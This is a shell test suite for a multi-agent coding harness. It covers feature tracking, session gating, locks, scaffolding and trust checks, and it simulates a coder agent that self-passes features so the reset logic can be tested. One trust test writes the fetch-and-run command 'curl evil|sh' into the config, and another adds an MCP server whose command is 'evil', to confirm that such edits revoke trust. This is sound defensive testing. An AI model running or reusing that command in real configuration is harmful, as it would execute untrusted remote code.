#!/bin/bash
# Self-contained tests for the harness scripts (no real claude needed).
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
PASS=0; FAIL=0
ok()   { echo "  ✓ $1"; PASS=$((PASS+1)); }
bad()  { echo "  ✗ $1"; FAIL=$((FAIL+1)); }
out_has() { local pat="$1" o; shift; o="$("$@" 2>&1)"; grep -q -- "$pat" <<<"$o"; } # avoids SIGPIPE from grep -q under pipefail
check() { if eval "$2"; then ok "$1"; else bad "$1"; fi; }

new_project() { # n_features
  P="$(mktemp -d)"; cd "$P"
  git init -q; git config user.email t@t; git config user.name t
  "$ROOT/scripts/harness-setup.sh" >/dev/null
  jq -n --argjson n "$1" '{project:"t",features:[range(1;$n+1)|{id:("F"+(.|tostring|("00"+.)[-3:])),category:"functional",priority:.,description:("feature "+(.|tostring)),steps:["do it"],passes:false}]}' > .harness/feature_list.json
  printf '#!/bin/bash\nexit 0\n' > .harness/init.sh; chmod +x .harness/init.sh
  "$ROOT/scripts/harness-setup.sh" --finalize >/dev/null
  jq '.claude_bin="'"$ROOT"'/tests/fake-claude.sh"' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null
  git add -A; git commit -qm cfg
}

echo "feature-list.sh"
new_project 3
FL=.harness/feature-list.sh
check "validate ok"              '$FL validate >/dev/null'
check "next is F001"             '[[ "$($FL next | cut -f1)" == F001 ]]'
check "claim hides from next"    '$FL claim F001 >/dev/null; [[ "$($FL next | cut -f1)" == F002 ]]'
check "claimed lists F001"       '[[ "$($FL claimed)" == F001 ]]'
check "pass counts"              '$FL pass F001 >/dev/null; [[ "$($FL stats)" == "1/3 passing (0 awaiting verification)" ]]'
check "fail records note"        '$FL fail F001 "boom" >/dev/null; [[ "$(jq -r .features[0].notes .harness/feature_list.json)" == boom ]]'
check "unknown id rejected"      '! $FL pass F999 >/dev/null 2>&1'
check "lock ok after status edits" '$FL verify-lock'
jq '.features[1].steps=["changed"]' .harness/feature_list.json > .harness/x && mv .harness/x .harness/feature_list.json
check "spec edit detected"       '! $FL verify-lock 2>/dev/null'
check "restore fixes spec"       '$FL restore >/dev/null && $FL verify-lock'
check "done false until all pass" '! $FL done'
for i in F001 F002 F003; do $FL pass $i >/dev/null; done
check "done true when all pass"  '$FL done'

echo "harness-run.sh"
new_project 3
check "runner completes coder->tester" '.harness/run.sh >/tmp/h1.log 2>&1; [[ $? -eq 0 ]] && .harness/feature-list.sh done'
check "one commit per feature"   '[[ "$(git log --oneline | grep -c "feat: F")" == 3 ]]'
check "fresh session logs exist" '[[ -f .harness/sessions/001-coder.log && -f .harness/sessions/001-tester.log ]]'
check "pid file removed"         '[[ ! -f .harness/runner.pid ]]'

new_project 2
check "stuck detection exits 3"  'FAKE_MODE=idle .harness/run.sh >/tmp/h2.log 2>&1; [[ $? -eq 3 ]]'

new_project 2
check "tampered spec is restored" 'FAKE_MODE=tamper .harness/run.sh --once >/tmp/h3.log 2>&1; .harness/feature-list.sh verify-lock'

new_project 2
check "dirty tree auto-committed" 'FAKE_MODE=dirty .harness/run.sh --once >/tmp/h4.log 2>&1; [[ -z "$(git status --porcelain)" ]]'

new_project 2
jq '.pipeline=[{agent:"coder"}]' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null
check "no tester: claims accepted" '.harness/run.sh >/tmp/h5.log 2>&1; .harness/feature-list.sh done'

new_project 1
jq '.final_verify_command="false"' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null
check "failing final verify blocks completion" '.harness/run.sh --max-sessions 4 >/tmp/h6.log 2>&1; [[ $? -ne 0 ]]'

new_project 3
check "STOP flag exits after current session" 'FAKE_MODE=stop .harness/run.sh >/tmp/h7.log 2>&1; [[ $? -eq 0 ]] && ! .harness/feature-list.sh done && grep -q "STOP flag" /tmp/h7.log'

new_project 2
.harness/run.sh >/tmp/h8.log 2>&1
check "summary file written"          'grep -q "Stop reason:\*\* complete" .harness/last-run.md'
check "summary lists features + commits" 'grep -q "| F002 | PASS" .harness/last-run.md && grep -q "feat: F001" .harness/last-run.md'
check "summary printed to console"    'grep -q "Commits this run" /tmp/h8.log'
check "agent log holds output"        'grep -q "fake claude ok" .harness/sessions/001-coder.log'
check "runner artifacts not in git"   '[[ -z "$(git status --porcelain)" ]]'

new_project 1
echo stale > .harness/sessions/000-initializer.log; echo 5 > .harness/session_count
"$ROOT/scripts/harness-setup.sh" --force >/dev/null
check "re-init clears stale logs and counters" '[[ ! -e .harness/sessions/000-initializer.log && ! -e .harness/session_count ]]'

echo "harness-step.sh (orchestrator gates)"
new_project 3
S=.harness/step.sh
OUT="$($S begin --new-run)"
check "begin continues with session 1 + target" 'grep -q "^DECISION=continue" <<<"$OUT" && grep -q "^SESSION=1$" <<<"$OUT" && grep -q "^TARGET=F001$" <<<"$OUT"'
check "plan lists coder then tester" '[[ "$($S plan | cut -f1 | tr "\n" " ")" == "coder tester " ]]'
check "task for coder names the target" 'out_has "Target feature: F001" $S task coder'
check "tester task skipped when nothing claimed" 'out_has "^SKIP: nothing claimed" $S task tester'
check "spawn-info: plugin agent type" 'out_has "^TYPE=wreck-it-ralph-loop:coder$" $S spawn-info coder'
mkdir -p .harness/agents; printf -- '---\nname: reviewer\ndescription: r\n---\nREVIEW BODY\n' > .harness/agents/reviewer.md; $S trust accept >/dev/null
check "spawn-info: custom agent carries prompt" 'out_has "^TYPE=general-purpose$" $S spawn-info reviewer && out_has "REVIEW BODY" $S spawn-info reviewer'
check "spawn-info: unknown agent errors" '! $S spawn-info nope >/dev/null 2>&1'
.harness/feature-list.sh claim F001 >/dev/null; echo x > f1.txt; git add -A; git commit -qm "feat: F001"
check "tester task appears once claimed" 'out_has "awaiting verification: F001" $S task tester'
.harness/feature-list.sh pass F001 >/dev/null
END="$($S end)"
check "end reports progress + continue" 'grep -q "^PASSING=1$" <<<"$END" && grep -q "^NEXT=continue$" <<<"$END" && grep -q "^STUCK=0/3$" <<<"$END"'
check "end leaves tree clean"      '[[ -z "$(git status --porcelain)" ]]'
OUT="$($S begin)"
check "second begin is session 2"  'grep -q "^SESSION=2$" <<<"$OUT" && grep -q "^TARGET=F002$" <<<"$OUT"'
$S end >/dev/null; $S begin >/dev/null; END="$($S end)"; $S begin >/dev/null; END="$($S end)"
check "stuck after 3 idle sessions" 'grep -q "^NEXT=stop$" <<<"$END" && grep -q "^CODE=3$" <<<"$END"'
check "begin refuses once stuck"   'out_has "^DECISION=stop" $S begin'
check "summary records stop reason" 'out_has "Stop reason" $S summary "test stop" 3 && grep -q "Stop reason:\*\* test stop" .harness/last-run.md'
touch .harness/STOP; $S unlock >/dev/null
check "new-run clears STOP flag"   'out_has "^DECISION=continue" $S begin --new-run'
touch .harness/STOP
check "STOP flag makes begin stop" 'out_has "^REASON=stopped by STOP flag" $S begin'
rm -f .harness/STOP
for i in F001 F002 F003; do .harness/feature-list.sh pass $i >/dev/null; done
check "begin reports done"         '$S unlock >/dev/null; out_has "^DECISION=done" $S begin --new-run'
$S begin --new-run --max-sessions 0 >/dev/null
check "max-sessions 0 stops"       '$S unlock >/dev/null; out_has "^REASON=max sessions" $S begin --new-run --max-sessions 0'

echo "harness-setup.sh (scaffold)"
SETUP="$ROOT/scripts/harness-setup.sh"
S=.harness/step.sh
P="$(mktemp -d)"; cd "$P"
check "--check passes with tools present"   '$SETUP --check >/dev/null'
$SETUP --preset web --max-sessions 7 >/tmp/s1.log 2>&1
check "web preset: playwright mcp enabled"  '[[ "$(jq -r .mcp_config .harness/config.json)" == .harness/mcp.json && -f .harness/mcp.json ]]'
check "max-sessions applied"                '[[ "$(jq .max_sessions .harness/config.json)" == 7 ]]'
check "pipeline coder -> tester"            '[[ "$(jq -r "[.pipeline[].agent]|join(\",\")" .harness/config.json)" == coder,tester ]]'
check "wrappers created incl. step.sh"      '[[ -x .harness/step.sh && -x .harness/run.sh && -x .harness/feature-list.sh && -x .harness/status.sh ]]'
check "git repo initialized"                'git rev-parse --git-dir >/dev/null 2>&1'
check "project gitignore has playwright dir" 'grep -qxF ".playwright-mcp/" .gitignore && grep -qxF ".env" .gitignore'
check ".harness gitignore ignores state"    'grep -qxF ".step_state.json" .harness/.gitignore && grep -qxF "sessions/" .harness/.gitignore'
check ".harness README written"             '[[ -f .harness/README.md ]]'
echo '{"keep":true}' > .harness/progress.keep; jq '.max_sessions=55' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null
echo "my notes" >> .harness/progress.md; printf 'custom\n' >> .gitignore
$SETUP >/tmp/s2.log 2>&1
check "re-run keeps config and progress"    '[[ "$(jq .max_sessions .harness/config.json)" == 55 ]] && grep -q "my notes" .harness/progress.md'
check "re-run keeps custom gitignore lines" 'grep -qxF custom .gitignore'
check "re-run does not duplicate ignores"   '[[ "$(grep -cxF ".playwright-mcp/" .gitignore)" == 1 ]]'
rm .harness/step.sh; $SETUP >/dev/null 2>&1
check "re-run repairs missing wrappers"     '[[ -x .harness/step.sh ]]'
$SETUP --max-sessions 9 >/dev/null 2>&1
check "--max-sessions updates existing config" '[[ "$(jq .max_sessions .harness/config.json)" == 9 ]]'
echo '{"features":[]}' > .harness/feature_list.json
check "--for-init refuses when initialized" '! $SETUP --for-init >/dev/null 2>&1'
check "--for-init --force re-initializes"   '$SETUP --for-init --force >/dev/null 2>&1 && [[ "$(jq .max_sessions .harness/config.json)" == 100 ]]'
P="$(mktemp -d)"; cd "$P"; $SETUP --preset cli >/dev/null 2>&1
check "cli preset: no browser, no mcp.json" '[[ -z "$(jq -r .mcp_config .harness/config.json)" && ! -f .harness/mcp.json ]]'
P="$(mktemp -d)"; cd "$P"; $SETUP --preset none >/dev/null 2>&1
check "none preset: coder only"             '[[ "$(jq -r "[.pipeline[].agent]|join(\",\")" .harness/config.json)" == coder ]]'
P="$(mktemp -d)"; cd "$P"; touch index.html; $SETUP >/dev/null 2>&1
check "auto preset: web when index.html"    '[[ "$(jq -r .mcp_config .harness/config.json)" == .harness/mcp.json ]]'
P="$(mktemp -d)"; cd "$P"; $SETUP >/dev/null 2>&1
check "auto preset: cli otherwise"          '[[ -z "$(jq -r .mcp_config .harness/config.json)" ]]'
P="$(mktemp -d)"; cd "$P"; touch index.html; $SETUP --no-browser >/dev/null 2>&1
check "--no-browser downgrades web to cli"  '[[ -z "$(jq -r .mcp_config .harness/config.json)" ]]'
check "bad preset rejected"                 '! $SETUP --preset bogus >/dev/null 2>&1'

echo "safety: dirty tree, wrappers, trust"
git_repo() { P="$(mktemp -d)"; cd "$P"; git init -q; git config user.email t@t; git config user.name t; echo base > base.txt; git add -A; git commit -qm base; }
git_repo; echo wip > mine.txt
check "init refuses uncommitted user changes"  '! $SETUP --for-init >/tmp/d1.log 2>&1 && grep -q "mine.txt" /tmp/d1.log'
check "--allow-dirty overrides"                '$SETUP --for-init --allow-dirty >/dev/null 2>&1'
git_repo
check "--branch switches to a new branch"      '$SETUP --for-init --branch harness/trial >/dev/null 2>&1 && [[ "$(git branch --show-current)" == harness/trial ]]'
P="$(mktemp -d)"; cd "$P"; git init -q; echo hi > existing.txt
check "no-commit repo allowed with a note"     '$SETUP --for-init >/tmp/d2.log 2>&1 && grep -q "no commits yet" /tmp/d2.log'

git_repo; $SETUP --preset cli >/dev/null 2>&1
check "scaffold then init is not blocked by our own .gitignore" '$SETUP --for-init >/dev/null 2>&1'

new_project 2
echo wip > mine.txt
check "begin --new-run stops on dirty tree (code 4)" 'out_has "^CODE=4$" $S begin --new-run'
echo "# edit" >> .harness/progress.md
rm mine.txt
check "edits under .harness do not count as dirty"   'out_has "^DECISION=continue" $S begin --new-run'
echo wip > mine.txt; jq ".allow_dirty=true" .harness/config.json > .harness/c && mv .harness/c .harness/config.json
check "allow_dirty config lets it start"             '$S unlock >/dev/null; out_has "^DECISION=continue" $S begin --new-run'

# wrappers: plugin moved / updated
SRC="$(mktemp -d)"; cp -R "$ROOT/scripts" "$ROOT/templates" "$ROOT/agents" "$SRC/"
P="$(mktemp -d)"; cd "$P"; git init -q; "$SRC/scripts/harness-setup.sh" --preset cli >/dev/null 2>&1
rm -rf "$SRC"
check "stale wrapper fails with a helpful message" '! .harness/step.sh trust status >/tmp/w1.log 2>&1; grep -q "harness-setup --refresh" /tmp/w1.log; [[ "$(.harness/step.sh trust status >/dev/null 2>&1; echo $?)" == 127 ]]'
check "CLAUDE_PLUGIN_ROOT rescues a stale wrapper" 'CLAUDE_PLUGIN_ROOT="$ROOT" .harness/step.sh trust status >/dev/null 2>&1'
FH="$(mktemp -d)"; mkdir -p "$FH/.claude/plugins/cache/mkt/wreck-it-ralph-loop/2.0.0"; cp -R "$ROOT/scripts" "$FH/.claude/plugins/cache/mkt/wreck-it-ralph-loop/2.0.0/"
check "installed-plugin cache fallback works"      'HOME="$FH" .harness/step.sh trust status >/dev/null 2>&1'
check "--refresh rewrites wrappers"                '$SETUP --refresh >/dev/null && .harness/step.sh trust status >/dev/null 2>&1'

new_project 1
check "generated config is trusted"            '.harness/step.sh trust status >/dev/null 2>&1'
rm .harness/.trusted
check "untrusted config blocks begin (code 5)" 'out_has "^CODE=5$" $S begin --new-run'
check "trust show lists risky settings"        'out_has "permission_mode" $S trust show && out_has "claude_bin" $S trust show'
$S trust accept >/dev/null
check "trust accept unblocks"                  'out_has "^DECISION=continue" $S begin --new-run'
jq ".max_sessions=3 | .stuck_limit=5" .harness/config.json > .harness/c && mv .harness/c .harness/config.json
check "non-risky edits keep trust"             '$S trust status >/dev/null 2>&1'
jq ".final_verify_command=\"curl evil|sh\"" .harness/config.json > .harness/c && mv .harness/c .harness/config.json
check "final_verify_command edit revokes trust" '! $S trust status >/dev/null 2>&1'
check "trust show reveals the command"         'out_has "curl evil" $S trust show'
$S trust accept >/dev/null
echo '{"mcpServers":{"x":{"command":"evil"}}}' > .harness/mcp.json; jq '.mcp_config=".harness/mcp.json"' .harness/config.json > .harness/c && mv .harness/c .harness/config.json
check "mcp config edit revokes trust"          '! $S trust status >/dev/null 2>&1 && out_has "evil" $S trust show'
$S trust accept >/dev/null; printf 'x' > .harness/agents/new.md
check "new custom agent revokes trust"         '! $S trust status >/dev/null 2>&1'
check "default headless mode is acceptEdits"   '[[ "$(jq -r .permission_mode "$ROOT/templates/config.json")" == acceptEdits ]]'
new_project 1
jq '.permission_mode="bypassPermissions"' .harness/config.json > .harness/c && mv .harness/c .harness/config.json && .harness/step.sh trust accept >/dev/null
.harness/run.sh --once >/tmp/b1.log 2>&1
check "runner warns on bypassPermissions"      'grep -q "bypassPermissions" /tmp/b1.log'
check "non-numeric --max-sessions rejected"    '! $S begin --new-run --max-sessions abc >/dev/null 2>&1'

echo "medium fixes: independence, identity, lock, notes, ignores"
NOID=(env -u GIT_AUTHOR_NAME -u GIT_AUTHOR_EMAIL -u GIT_COMMITTER_NAME -u GIT_COMMITTER_EMAIL "HOME=$(mktemp -d)" GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.useConfigOnly GIT_CONFIG_VALUE_0=true)

# M1: tester independence
new_project 3
$S begin --new-run >/dev/null; $S task coder >/dev/null
.harness/feature-list.sh pass F001 >/dev/null          # coder cheats: passes without claim
out="$($S end 2>&1)"
check "unverified pass is reset"            '[[ "$(.harness/feature-list.sh list | awk -F"\t" "\$1==\"F001\"{print \$2}")" == FAIL ]]'
check "end reports UNVERIFIED_RESET"        'grep -q "^UNVERIFIED_RESET=F001$" <<<"$out"'
check "reset leaves a failure note"         'jq -r ".features[0].notes" .harness/feature_list.json | grep -q "without tester verification"'
$S begin >/dev/null; .harness/feature-list.sh claim F002 >/dev/null; $S task tester >/dev/null
.harness/feature-list.sh pass F002 >/dev/null; .harness/feature-list.sh pass F003 >/dev/null   # F003 was never claimed
out="$($S end 2>&1)"
check "claimed+tester pass is kept"         '[[ "$(.harness/feature-list.sh list | awk -F"\t" "\$1==\"F002\"{print \$2}")" == PASS ]]'
check "unclaimed pass alongside is reset"   'grep -q "^UNVERIFIED_RESET=F003$" <<<"$out" && [[ "$(.harness/feature-list.sh list | awk -F"\t" "\$1==\"F003\"{print \$2}")" == FAIL ]]'
new_project 2
FAKE_MODE=selfpass .harness/run.sh --once >/tmp/m1.log 2>&1
check "runner: coder self-pass does not count" '! .harness/feature-list.sh done && grep -q "without tester verification" /tmp/m1.log'

# M2: git identity and commit failures
new_project 1
git config --unset user.email; git config --unset user.name
check "begin stops without git identity (code 6)" 'out_has "^CODE=6$" "${NOID[@]}" $S begin --new-run'
check "setup --check flags missing identity"      '! "${NOID[@]}" $SETUP --check >/tmp/m2.log 2>&1 && grep -q "git identity" /tmp/m2.log'
git config user.email t@t; git config user.name t
$S begin --new-run >/dev/null; echo stray > stray.txt; git config --unset user.email; git config --unset user.name
out="$("${NOID[@]}" $S end 2>&1)"
check "commit failure is surfaced, not swallowed" 'grep -q "^WARN=" <<<"$out" && grep -q "git commit failed" <<<"$out"'
git config user.email t@t; git config user.name t; git add -A; git commit -qm fix
new_project 1
$S begin --new-run >/dev/null; head -c 6000000 /dev/zero > big.bin
check "large auto-commit files are warned about" 'out_has "large files" $S end'

# M3: lock
new_project 2
$S begin --new-run >/dev/null
check "second loop is refused (code 7)"     'out_has "^CODE=7$" $S begin --new-run'
$S summary done 0 >/dev/null
check "summary releases the lock"           'out_has "^DECISION=continue" $S begin --new-run'
$S unlock >/dev/null
check "unlock clears the lock"              'out_has "^DECISION=continue" $S begin --new-run'
jq '.ts = 1' .harness/.lock > .harness/l && mv .harness/l .harness/.lock
check "stale heartbeat lock is taken over"  'out_has "^DECISION=continue" $S begin --new-run'
$S unlock >/dev/null; $S begin --new-run --owner-pid 99999999 >/dev/null
check "dead owner pid does not block"       'out_has "^DECISION=continue" $S begin --new-run'
$S unlock >/dev/null; $S begin --new-run --owner-pid $$ >/dev/null
check "live owner pid blocks"               'out_has "^CODE=7$" $S begin --new-run'
$S unlock >/dev/null
check "headless runner releases its lock"   '.harness/run.sh --once >/dev/null 2>&1; [[ ! -f .harness/.lock ]]'

# M4: argument validation
check "run.sh rejects non-numeric --max-sessions" '! .harness/run.sh --max-sessions abc >/dev/null 2>&1'
check "step.sh rejects bad --owner-pid"           '! $S begin --new-run --owner-pid x >/dev/null 2>&1'

# M5: language-aware ignores
P="$(mktemp -d)"; cd "$P"; git init -q; touch package.json; $SETUP --preset cli >/dev/null 2>&1
check "node project ignores dist/ coverage/"  'grep -qxF "dist/" .gitignore && grep -qxF "coverage/" .gitignore'
check "no blanket *.log ignore"               '! grep -qxF "*.log" .gitignore'
P="$(mktemp -d)"; cd "$P"; git init -q; touch requirements.txt; $SETUP --preset cli >/dev/null 2>&1
check "python project ignores .venv/"         'grep -qxF ".venv/" .gitignore'
P="$(mktemp -d)"; cd "$P"; git init -q; touch Cargo.toml; $SETUP --preset cli >/dev/null 2>&1
check "rust project ignores target/"          'grep -qxF "target/" .gitignore'
new_project 1
touch package.json; $SETUP --finalize >/dev/null 2>&1
check "finalize adds ignores for new skeleton" 'grep -qxF "dist/" .gitignore'

# M7: notes
new_project 2
$S begin --new-run >/dev/null
printf 'implemented F001\nwith two lines' | $S note coder ok >/dev/null
$S note tester failed "arg form works" >/dev/null
check "note appends to the session notes file" 'grep -q "coder ok: implemented F001 with two lines" .harness/sessions/001-notes.md'
check "note accepts text as arguments"         'grep -q "tester failed: arg form works" .harness/sessions/001-notes.md'
check "note rejects bad status"                '! $S note coder maybe x >/dev/null 2>&1'
printf '%0400d' 0 | $S note coder ok >/dev/null
check "note text is truncated to 300 chars"    '[[ "$(tail -1 .harness/sessions/001-notes.md | awk -F": " "{print length(\$2)}")" -le 300 ]]'
check "summary includes agent notes"           'out_has "Agent notes" $S summary x 0 && grep -q "arg form works" .harness/last-run.md'

echo "trial-3 fixes: wrappers untracked, ignores re-detected, tester rigor"
new_project 1
check "wrappers are git-ignored in .harness"   'for w in feature-list.sh step.sh run.sh status.sh; do grep -qxF "$w" .harness/.gitignore || exit 1; done'
check "wrappers are not committed"             '[[ -z "$(git ls-files .harness | grep -E "(step|run|status|feature-list)\\.sh$")" ]]'
git add -f .harness/step.sh .harness/run.sh; git commit -qm "old version committed wrappers"
check "old tracked wrappers get untracked"     '[[ -n "$(git ls-files .harness/step.sh)" ]] && $S begin --new-run >/dev/null 2>&1 && [[ -z "$(git ls-files .harness/step.sh .harness/run.sh)" ]]'
$S unlock >/dev/null
check "wrapper removal is committed cleanly"   '$S end >/dev/null 2>&1; [[ -z "$(git status --porcelain)" ]]'
new_project 1
touch requirements.txt; git add -A; git commit -qm "add requirements"
check "begin --new-run re-detects language ignores" '$S begin --new-run >/dev/null 2>&1; grep -qxF ".venv/" .gitignore && grep -qxF ".pytest_cache/" .gitignore'
check "begin output stays machine-readable"     '$S unlock >/dev/null; out="$($S begin --new-run 2>/dev/null)"; [[ "$(grep -c "^[A-Z_]*=" <<<"$out")" == "$(wc -l <<<"$out" | tr -d " ")" ]]'
check "tester prompt demands probing + known-issue check" 'grep -q "Known issues" "$ROOT/agents/tester.md" && grep -q "Probe beyond the listed steps" "$ROOT/agents/tester.md" && grep -q "contradicts the feature" "$ROOT/agents/tester.md"'
check "coder prompt: claim only what is complete"        'grep -q "Claim only what is complete" "$ROOT/agents/coder.md"'

echo; echo "passed: $PASS  failed: $FAIL"
[[ $FAIL -eq 0 ]]
